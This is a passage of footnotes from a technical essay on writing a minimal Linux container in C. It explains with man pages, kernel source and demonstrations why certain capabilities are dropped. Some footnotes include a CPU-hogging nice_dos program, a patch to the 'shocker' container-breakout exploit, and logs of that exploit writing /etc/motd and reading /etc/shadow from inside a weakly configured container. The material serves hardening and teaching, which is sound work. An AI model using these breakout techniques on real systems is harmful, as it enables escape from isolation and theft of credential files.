		dev_load(net, ifr.ifr_name);
		[...]
}

```

This was pretty surprising to me! I should look into this further.

[25](#fnr.25)
Listing 67: [`man 2 nice`](http://man7.org/linux/man-pages/man2/nice.2.html)
```
DESCRIPTION
	nice() adds inc  to the nice value for  the calling process.
	(A  higher  nice value  means  a  low priority.)   Only  the
	superuser  may specify  a  negative  increment, or  priority
	increase.
	[...]

ERRORS

	EPERM
		The calling process attempted  to increase its priority
		by  supplying  a  negative  inc  but  has  insufficient
		privileges.  Under  Linux, the  CAP_SYS_NICE capability
		is   required.   (But   see  the   discussion  of   the
		RLIMIT_NICE resource limit in setrlimit(2).)

```

[26](#fnr.26)

We'll see how many CPU cycles this gets in a single-core virtual
machine, in the host and in a container that can set low nice values:

Listing 68: `busy_loop.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static busy_loop.c -o busy_loop" -*- */
#include <time.h>
#include <sys/times.h>
#include <stdio.h>

int main (int argc, char  **argv)
{
	struct timespec now = {0};
	struct timespec then = {0};
	clock_gettime(CLOCK_MONOTONIC, &then);
	do {
		clock_gettime(CLOCK_MONOTONIC, &now);
	} while ((now.tv_sec - then.tv_sec) * 5e9
		 + now.tv_nsec - then.tv_nsec < 20e9);
	/* how much cpu time did we get? */
	struct tms tms = {0};
	if (times(&tms) == -1) {
		fprintf(stderr, "++ times failed: %m\n");
		return 1;
	}
	/*  "The tms_utime field contains the CPU time spent executing
	    instructions of the calling process.  The tms_stime field contains the
	    CPU time spent in the system while executing tasks on behalf of the
	    calling process." */
	printf("ticks: %lu\n", tms.tms_utime + tms.tms_stime);
	return 0;
}

```

Listing 69: `nice_dos.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static nice_dos.c -o nice_dos" -*- */
#include <unistd.h>
#include <stdio.h>

int main (int argc, char **argv)
{
	if (nice(-10) == -1) {
		fprintf(stderr, "++ nice failed: %m\n");
		return 1;
	}
	if (execve("./busy_loop", (char *[]) { "./busy_loop", 0 }, NULL)) {
		fprintf(stderr, "++ execve failed: %m\n");
		return 1;
	}
}

```

Listing 70: `allow_capsysnice.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..4895071 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -44,7 +44,6 @@ int capabilities()
 		CAP_SYS_ADMIN,
 		CAP_SYS_BOOT,
 		CAP_SYS_MODULE,
-		CAP_SYS_NICE,
 		CAP_SYS_RAWIO,
 		CAP_SYS_RESOURCE,
 		CAP_SYS_TIME,

```
```

alpine-kernel-dev:~# (./busy_loop && echo '^ uncontained one' &) && (sudo ./contained.allow_capsysnice -m . -u 0 -c ./nice_dos &)
=> validating Linux version...4.7.6.
=> setting cgroups...memory...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.elKMci...done.
=> trying a user namespace...unsupported? continuing.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
ticks: 52
^ uncontained one
ticks: 341
=> cleaning cgroups...done.
alpine-kernel-dev:~#

```

[27](#fnr.27)
Listing 72: [`man 7 capabilities`](http://man7.org/linux/man-pages/man7/capabilities.7.html)
```
	CAP_SYS_RAWIO
		* Perform I/O port operations (iopl(2) and ioperm(2));
		* access /proc/kcore;
		* employ the FIBMAP ioctl(2) operation;
		* open   devices  for   accessing  x86   model-specific
		  registers (MSRs, see msr(4))
		* update /proc/sys/vm/mmap_min_addr;
		* create memory  mappings at addresses below  the value
		  specified by /proc/sys/vm/mmap_min_addr;
		* map files in /proc/bus/pci;
		* open /dev/mem and /dev/kmem;
		* perform various SCSI device commands;
		* perform  certain operations  on hpsa(4)  and cciss(4)
		  devices;
		* perform  a  range  of device-specific  operations  on
		  other devices.

```

[28](#fnr.28)
Listing 73: [`man 4 mem`](http://man7.org/linux/man-pages/man4/mem.4.html)
```
	/dev/mem is a character device file  that is an image of the
	main memory of  the computer.  It may be  used, for example,
	to examine (and even patch) the system.

	[...]

	It is typically created by:

		mknod -m 660 /dev/mem c 1 1
		chown root:kmem /dev/mem

	The file /dev/kmem is the  same as /dev/mem, except that the
	kernel  virtual  memory  rather   than  physical  memory  is
	accessed.  Since  Linux 2.6.26, this file  is available only
	if  the   CONFIG_DEVKMEM  kernel  configuration   option  is
	enabled.

	It is typically created by:

		mknod -m 640 /dev/kmem c 1 2
		chown root:kmem /dev/kmem

	/dev/port  is similar  to /dev/mem,  but the  I/O ports  are
	accessed.

	It is typically created by:

		mknod -m 660 /dev/port c 1 4
		chown root:kmem /dev/port

```

[29](#fnr.29)
Listing 74: [`man 2 ioperm`](http://man7.org/linux/man-pages/man2/ioperm.2.html)
```
	ioperm()  sets  the  port  access permission  bits  for  the
	calling thread for num bits starting from port address from.
	If  turn_on is  nonzero, then  permission for  the specified
	bits is  enabled; otherwise it  is disabled.  If  turn_on is
	nonzero,   the    calling   thread   must    be   privileged
	(CAP_SYS_RAWIO).

```

Listing 75: [`man 2 iopl`](http://man7.org/linux/man-pages/man2/iopl.2.html)
```
	iopl()  changes  the  I/O  privilege level  of  the  calling
	process, as specified  by the two least  significant bits in
	level.

	This call is necessary to allow 8514-compatible X servers to
	run under  Linux.  Since these  X servers require  access to
	all 65536 I/O ports, the ioperm(2) call is not sufficient.

	In  addition  to  granting  unrestricted  I/O  port  access,
	running  at a  higher I/O  privilege level  also allows  the
	process to disable interrupts.  This will probably crash the
	system, and is not recommended.

```

[30](#fnr.30)
Listing 77: [`man 7 capabilities`](http://man7.org/linux/man-pages/man7/capabilities.7.html)
```
	CAP_SYS_RESOURCE
		* Use reserved space on ext2 filesystems;
		* make ioctl(2) calls controlling ext3 journaling;
		* override disk quota limits;
		* increase resource limits (see setrlimit(2));
		* override RLIMIT_NPROC resource limit;
		* override  maximum  number   of  consoles  on  console
		  allocation;
		* override maximum number of keymaps;
		* allow more  than 64hz  interrupts from  the real-time
		  clock;
		* raise msg_qbytes  limit for a System  V message queue
		  above  the  limit   in  /proc/sys/kernel/msgmnb  (see
		  msgop(2) and msgctl(2));
		* override  the  /proc/sys/fs/pipe-size-max limit  when
		  setting the capacity of a pipe using the F_SETPIPE_SZ
		  fcntl(2) command.
		* use F_SETPIPE_SZ  to increase the capacity  of a pipe
		  above       the        limit       specified       by
		  /proc/sys/fs/pipe-max-size;
		* override  /proc/sys/fs/mqueue/queues_max  limit  when
		  creating POSIX message queues (see mq_overview(7));
		* employ prctl(2) PR_SET_MM operation;
		* set /proc/PID/oom_score_adj to a value lower than the
		  value last set by a process with CAP_SYS_RESOURCE.

```

[31](#fnr.31)

[Brad Spengler agreees in "False Boundaries and Arbitrary Code Execution":](https://forums.grsecurity.net/viewtopic.php?f%3D7&t%3D2522)

> No transitions known (to this author, yet):
> […]
> CAP\_SYS\_RESOURCE
> […]

[32](#fnr.32)

It turns out that you can break important things by altering the
time. ["Authenticated Network Time Synchronization"](https://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper_dowling.pdf) describes some of
these:

> The importance of accurate time for security. There are many
> examples of security mechanisms which (often implicitly) rely on
> having an accurate clock:
>
> * Certificate validation in TLS and other protocols. Validating a
>   public key certificate requires confirming that the current time
>   is within the certificateâs validity period. Performing validation
>   with a slow or inaccurate clock may cause expired certificates to
>   be accepted as valid. A revoked certificate may also validate if
>   the clock is slow, since the relying party will not check for
>   updated revocation information.
> * Ticket verification in Kerberos. In Kerberos, authentication
>   tickets have a validity period, and proper verification requires
>   an accurate clock to prevent authentication with an expired
>   ticket.
> * HTTP Strict Transport Security (HSTS) policy duration. HSTS allows
>   website administrators to protect against downgrade attacks from
>   HTTPS to HTTP by sending a header to browsers indicating that
>   HTTPS must be used instead of HTTP. HSTS policies specify the
>   duration of time that HTTPS must be used. If the browserâs clock
>   jumps ahead, the policy may expire re-allowing downgrade attacks.
>   A related mechanism, HTTP Public Key Pinning also relies on
>   accurate client time for security.
>
> For clients who set their clocks using NTP, these security
> mechanisms (and others) can be attacked by a network-level attacker
> who can intercept and modify NTP traffic, such as a malicious
> wireless access point or an insider at an ISP. In practice, most NTP
> servers do not authenticate themselves to clients, so a network
> attacker can intercept responses and set the timestamps arbitrarily.
> Even if the client sends requests to multiple servers, these may all
> be intercepted by an upstream network device and modified to present
> a consistently incorrect time to a victim. Such an attack on HSTS
> was demonstrated by [Selvi](https://www.blackhat.com/docs/eu-14/materials/eu-14-Selvi-Bypassing-HTTP-Strict-Transport-Security-wp.pdf), who provided a tool to advance the clock
> of victims in order to expire HSTS policies. [Malhotra et al](http://www.cs.bu.edu/~goldbe/NTPattack.html).
> present a variety of attacks that rely on NTP being unauthenticated,
> further emphasizing the need for authenticated time synchronization.

[33](#fnr.33)
Listing 80: [`man 7 capabilities`](http://man7.org/linux/man-pages/man7/capabilities.7.html)
```
       CAP_WAKE_ALARM (since Linux 3.0)
	      Trigger something that will wake up the system (set
	      CLOCK_REALTIME_ALARM and CLOCK_BOOTTIME_ALARM timers).

```

I had trouble finding more information about these, but ["Waking
systems from suspend" on LWN](https://lwn.net/Articles/429925/) goes into more detail:

> these timers are exposed to user space via the standard POSIX
> clocks and timers interface, using the new the
> CLOCK\_REALTIME\_ALARM clockid. The new clockid behaves identically
> to CLOCK\_REALTIME except that timers set against the \_ALARM
> clockid will wake the system if it is suspended.

[34](#fnr.34)

[Brad Spengler's "False Boundaries and Arbitrary Code Execution"](https://forums.grsecurity.net/viewtopic.php?f%3D7&t%3D2522):

> CAP\_DAC\_OVERRIDE: generic: same bypass as CAP\_DAC\_READ\_SEARCH, can
> also modify a non-suid binary executed by root to execute code
> with full privileges (modifying a suid root binary for you to
> execute would require CAP\_FSETID, as the setuid bit is cleared on
> modification otherwise; thanks to Eric Paris). The modprobe sysctl
> can be modified as mentioned above to execute code with full
> capabilities.

and of course [Sebastian Krahmer's email](http://www.openwall.com/lists/oss-security/2014/06/18/4):

> In 0.11 the problem is that the apps that run in the container
> have CAP\_DAC\_READ\_SEARCH and CAP\_DAC\_OVERRIDE which allows the
> containered app to access files not just by pathname (which would be
> impossible due to the bind mount of the rootfs) but also by handles via
> open\_by\_handle\_at().

He might mean that the combination of both of them is problematic,
though, which is absolutely true: with `CAP_DAC_OVERRIDE` and
`CAP_DAC_READ_SEARCH`, it's possible to modify arbitrary files:

Listing 83: `shocker_write.patch`
```
48a49,50
> char new_motd[] = "The tea from 2014 kicks your sekurity again\n";
>
149d150
< 	char buf[0x1000];
161,163c162
< 	       "[***] forward to my friends who drink secury-tea too!      [***]\n\n<enter>\n");
<
< 	read(0, buf, 1);
---
> 	       "[***] forward to my friends who drink secury-tea too!      [***]\n");
169c168
< 	if (find_handle(fd1, "/etc/shadow", &root_h, &h) <= 0)
---
> 	if (find_handle(fd1, "/etc/motd", &root_h, &h) <= 0)
175c174
< 	if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
---
> 	if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_WRONLY)) < 0)
178,180c177,179
< 	memset(buf, 0, sizeof(buf));
< 	if (read(fd2, buf, sizeof(buf) - 1) < 0)
< 		die("[-] read");
---
> 	if (write(fd2, new_motd, sizeof(new_motd)) != sizeof(new_motd))
> 		die("[-] write");
>
182c181
< 	fprintf(stderr, "[!] Win! /etc/shadow output follows:\n%s\n", buf);
---
> 	fprintf(stderr, "[!] Win! /etc/motd written.\n");

```

Listing 84: `allow_capdacreadsearch.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..c0cabcc 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -33,7 +33,6 @@ int capabilities()
 		CAP_AUDIT_READ,
 		CAP_AUDIT_WRITE,
 		CAP_BLOCK_SUSPEND,
-		CAP_DAC_READ_SEARCH,
 		CAP_FSETID,
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,

```
```

[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capdacreadsearch -m . -u 0 -c ./shocker_write
=> validating Linux version...4.8.4-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.axVxAE...done.
=> trying a user namespace...unsupported? continuing.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]
[*] Resolving 'etc/motd'
[*] Found .
[*] Found ..
[*] Found lib64
[*] Found sys
[*] Found run
[*] Found sbin
[*] Found opt
[*] Found tmp
[*] Found lost+found
[*] Found dev
[*] Found mnt
[*] Found root
[*] Found lib
[*] Found boot
[*] Found home
[*] Found usr
[*] Found bin
[*] Found srv
[*] Found etc
[+] Match: etc ino=4325377
[*] Brute forcing remaining 32bit. This can take a while...
[*] (etc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x01, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'motd'
[*] Found binfmt.d
[*] Found ts.conf
[*] Found nscd.conf
[*] Found dhcpcd.duid
[*] Found sensors3.conf
[*] Found libao.conf
[*] Found .
[*] Found motd
[+] Match: motd ino=4325389
[*] Brute forcing remaining 32bit. This can take a while...
[*] (motd) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x0d, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x0d, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/motd written.
=> cleaning cgroups...done.

```

[35](#fnr.35)
Listing 85: `allow_capdacreadsearch.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..c0cabcc 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -33,7 +33,6 @@ int capabilities()
 		CAP_AUDIT_READ,
 		CAP_AUDIT_WRITE,
 		CAP_BLOCK_SUSPEND,
-		CAP_DAC_READ_SEARCH,
 		CAP_FSETID,
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,

```

Listing 86: `allow_capdacreadsearch.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..c0cabcc 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -33,7 +33,6 @@ int capabilities()
 		CAP_AUDIT_READ,
 		CAP_AUDIT_WRITE,
 		CAP_BLOCK_SUSPEND,
-		CAP_DAC_READ_SEARCH,
 		CAP_FSETID,
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,

```
```

[lizzie@empress l-c-i-500-l]$sudo ./contained -m . -u 0 -c ./shocker
=> validating Linux version...4.8.4-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.bWoGr4...done.
=> trying a user namespace...unsupported? continuing.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

<enter>

[*] Resolving 'etc/shadow'
[-] open_by_handle_at: Operation not permitted
=> cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capdacreadsearch -m . -u 0 -c ./shocker
=> validating Linux version...4.8.4-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.Jto0pj...done.
=> trying a user namespace...unsupported? continuing.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

<enter>

[*] Resolving 'etc/shadow'
[*] Found .
[*] Found ..
[*] Found lib64
[*] Found sys
[*] Found run
[*] Found sbin
[*] Found opt
[*] Found tmp
[*] Found lost+found
[*] Found dev
[*] Found mnt
[*] Found root
[*] Found lib
[*] Found boot
[*] Found home
[*] Found usr
[*] Found bin
[*] Found srv
[*] Found etc
[+] Match: etc ino=4325377
[*] Brute forcing remaining 32bit. This can take a while...
[*] (etc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x01, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'shadow'
[*] Found binfmt.d
[*] Found ts.conf
[*] Found nscd.conf
[*] Found dhcpcd.duid
[*] Found sensors3.conf
[*] Found libao.conf
[*] Found .
[*] Found motd
[*] Found gdb
[*] Found ..
[*] Found qemu
[*] Found lirc
[*] Found healthd.conf
[*] Found subuid
[*] Found locale.gen.pacnew
[*] Found gtk-3.0
[*] Found idn.conf
[*] Found wgetrc
[*] Found mime.types
[*] Found texmf
[*] Found request-key.conf
[*] Found xinetd.d
[*] Found ssl
[*] Found ifplugd
[*] Found mpd.conf
[*] Found gimp
[*] Found logrotate.d
[*] Found dhcpcd.conf
[*] Found trusted-key.key
[*] Found resolv.conf
[*] Found gemrc
[*] Found libpaper.d
[*] Found hostname
[*] Found kernel
[*] Found audit
[*] Found request-key.d
[*] Found subgid
[*] Found services
[*] Found protocols
[*] Found profile.d
[*] Found Muttrc.dist
[*] Found audisp
[*] Found default
[*] Found resolv.conf.bak
[*] Found ufw
[*] Found man_db.conf
[*] Found gconf
[*] Found geoclue
[*] Found netconfig
[*] Found nanorc
[*] Found environment
[*] Found crypttab
[*] Found brltty.conf
[*] Found logrotate.conf
[*] Found goaccess.conf
[*] Found nsswitch.conf
[*] Found shadow
[+] Match: shadow ino=4334485
[*] Brute forcing remaining 32bit. This can take a while...
[*] (shadow) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x95, 0x23, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x95, 0x23, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/shadow output follows:
[redacted]
=> cleaning cgroups...done.

```

[36](#fnr.36)
Listing 87: [`fs/namei.c:316@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/fs/namei.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n316):
```
int generic_permission(struct inode *inode, int mask)
{
	int ret;

	/*
	 * Do the basic permission checks.
	 */
	ret = acl_permission_check(inode, mask);
	if (ret != -EACCES)
		return ret;

	if (S_ISDIR(inode->i_mode)) {
		/* DACs are overridable for directories */
		if (capable_wrt_inode_uidgid(inode, CAP_DAC_OVERRIDE))
			return 0;
		if (!(mask & MAY_WRITE))
			if (capable_wrt_inode_uidgid(inode,
						     CAP_DAC_READ_SEARCH))
				return 0;
		return -EACCES;
	}
	/*
	 * Read/write DACs are always overridable.
	 * Executable DACs are overridable when there is
	 * at least one exec bit set.
	 */
	if (!(mask & MAY_EXEC) || (inode->i_mode & S_IXUGO))
		if (capable_wrt_inode_uidgid(inode, CAP_DAC_OVERRIDE))
			return 0;

	/*
	 * Searching includes executable on directories, else just read.
	 */
	mask &= MAY_READ | MAY_WRITE | MAY_EXEC;
	if (mask == MAY_READ)
		if (capable_wrt_inode_uidgid(inode, CAP_DAC_READ_SEARCH))
			return 0;

	return -EACCES;
}

```

[37](#fnr.37)

[`man 5 acct`](http://man7.org/linux/man-pages/man5/acct.5.html) gives more useful information about this system than [`man
2 acct`](http://man7.org/linux/man-pages/man2/acct.2.html).

[38](#fnr.38)

`CAP_IPC_OWNER` is only used in `ipcperms`:

Listing 88: [`ipc/util.c:468@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/util.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n468)
```
/**
 * ipcperms - check ipc permissions
 * @ns: ipc namespace
 * @ipcp: ipc permission set
 * @flag: desired permission set
 *
 * Check user, group, other permissions for access
 * to ipc resources. return 0 if allowed
 *
 * @flag will most probably be 0 or S_...UGO from <linux/stat.h>
 */
int ipcperms(struct ipc_namespace *ns, struct kern_ipc_perm *ipcp, short flag)
{
	kuid_t euid = current_euid();
	int requested_mode, granted_mode;

	audit_ipc_obj(ipcp);
	requested_mode = (flag >> 6) | (flag >> 3) | flag;
	granted_mode = ipcp->mode;
	if (uid_eq(euid, ipcp->cuid) ||
	    uid_eq(euid, ipcp->uid))
		granted_mode >>= 6;
	else if (in_group_p(ipcp->cgid) || in_group_p(ipcp->gid))
		granted_mode >>= 3;
	/* is there some bit set in requested_mode but not in granted_mode? */
	if ((requested_mode & ~granted_mode & 0007) &&
	    !ns_capable(ns->user_ns, CAP_IPC_OWNER))
		return -1;

	return security_ipc_permission(ipcp, flag);
}

```

It's used in the following places immediately after looking up the IPC
object in the IPC namespace:

* In the IPC shared memory system [`ipc/shm.c@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/shm.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3) (done after
  `shm_obtain_object` and `shm_obtain_object_check`):
  + [`ipc/shm.c:869@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/shm.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n869): `shmctl_nolock`
  + [`ipc/shm.c:1081@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/shm.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1081): `do_shmat`
* In the IPC semaphore system, [`ipc/sem.c@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3) (done `sem_obtain_object`
  and `sem_obtain_object_check`):
  + [`ipc/sem.c:1200@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1200): `semctl_nolock`
  + [`ipc/sem.c:1289@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1289): `semctl_setval`
  + [`ipc/sem.c:1360@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1360): `semctl_main`
  + [`ipc/sem.c:1816@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1816): `semtimedop`
* In the IPC message queue system, [`ipc/msg.c@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3) (done after
  `msq_obtain_object` and `msq_obtain_object_check)`:
  + [`ipc/msg.c:445@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n445): `msgctl_nolock`
  + [`ipc/msg.c:630@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n630): `do_msgsnd`
  + [`ipc/msg.c:846@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n846): `do_msgrcv`

`ipc_check_perms` is another a thin layer over it that doesn't check the IPC namespace.

Listing 89: [`ipc/util.c:290@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/util.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n290)
```
/**
 * ipc_check_perms - check security and permissions for an ipc object
 * @ns: ipc namespace
 * @ipcprgre: ipc permission set
 * @ops: the actual security routine to call
 * @params: its parameters
 *
 * This routine is called by sys_msgget(), sys_semget() and sys_shmget()
 * when the key is not IPC_PRIVATE and that key already exists in the
 * ds IDR.
 *
 * On success, the ipc id is returned.
 *
 * It is called with ipc_ids.rwsem and ipcp->lock held.
 */
static int ipc_check_perms(struct ipc_namespace *ns,
			   struct kern_ipc_perm *ipcp,
			   const struct ipc_ops *ops,
			   struct ipc_params *params)
{
	int err;

	if (ipcperms(ns, ipcp, params->flg))
		err = -EACCES;
	else {
		err = ops->associate(ipcp, params->flg);
		if (!err)
			err = ipcp->id;
	}

	return err;
}

```

which is called by `ipcget_public`.

Listing 90: [`ipc/util.c:323@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/util.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n323)
```
/**
 * ipcget_public - get an ipc object or create a new one
 * @ns: ipc namespace
 * @ids: ipc identifier set
 * @ops: the actual creation routine to call
 * @params: its parameters
 *
 * This routine is called by sys_msgget, sys_semget() and sys_shmget()
 * when the key is not IPC_PRIVATE.
 * It adds a new entry if the key is not found and does some permission
 * / security checkings if the key is found.
 *
 * On success, the ipc id is returned.
 */
static int ipcget_public(struct ipc_namespace *ns, struct ipc_ids *ids,
		const struct ipc_ops *ops, struct ipc_params *params)
{
	struct kern_ipc_perm *ipcp;
	int flg = params->flg;
	int err;

	/*
	 * Take the lock as a writer since we are potentially going to add
	 * a new entry + read locks are not "upgradable"
	 */
	down_write(&ids->rwsem);
	ipcp = ipc_findkey(ids, params->key);
	if (ipcp == NULL) {
		/* key not used */
		if (!(flg & IPC_CREAT))
			err = -ENOENT;
		else
			err = ops->getnew(ns, params);
	} else {
		/* ipc object has been locked by ipc_findkey() */

		if (flg & IPC_CREAT && flg & IPC_EXCL)
			err = -EEXIST;
		else {
			err = 0;
			if (ops->more_checks)
				err = ops->more_checks(ipcp, params);
			if (!err)
				/*
				 * ipc_check_perms returns the IPC id on
				 * success
				 */
				err = ipc_check_perms(ns, ipcp, ops, params);
		}
		ipc_unlock(ipcp);
	}
	up_write(&ids->rwsem);

	return err;
}

```

`ipcget_public` handles both creation and accessing for
non-`IPC_PRIVATE` requests. It **doesn't** check IPC namespace for
existing IPC objects. It's called by `ipc_get` if `IPC_PRIVATE` is not
set:

Listing 91: [`ipc/util.c:625@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/util.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n625)
```
/**
 * ipcget - Common sys_*get() code
 * @ns: namespace
 * @ids: ipc identifier set
 * @ops: operations to be called on ipc object creation, permission checks
 *       and further checks
 * @params: the parameters needed by the previous operations.
 *
 * Common routine called by sys_msgget(), sys_semget() and sys_shmget().
 */
int ipcget(struct ipc_namespace *ns, struct ipc_ids *ids,
			const struct ipc_ops *ops, struct ipc_params *params)
{
	if (params->key == IPC_PRIVATE)
		return ipcget_new(ns, ids, ops, params);
	else
		return ipcget_public(ns, ids, ops, params);
}

```

whcih in turn is called in the following places:

* [`ipc/shm.c:654@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/shm.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n654): `shmget`
* [`ipc/sem.c:604@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n604): `semget`
* [`ipc/msg.c:265@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n265): `msgget`

But `shmget`, `semget`, and `msgget` are all part of the System V IPC
set, and in order to use them you need to call `shmat`, `semop` /
`semtimedop`, and `msgsend` / `msgrcv~`, all only work for objects in
the namespace:

`shmat` immediately calls `do_shmat`, which is listed above;

Listing 92: [`ipc/shm.c:1249@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/shm.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1249)
```
SYSCALL_DEFINE3(shmat, int, shmid, char __user *, shmaddr, int, shmflg)
{
	unsigned long ret;
	long err;

	err = do_shmat(shmid, shmaddr, shmflg, &ret, SHMLBA);
	if (err)
		return err;
	force_successful_syscall_return();
	return (long)ret;
}

```

`semop` calls `semtimedop`:

Listing 93: [`ipc/sem.c:20151@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n2051)
```
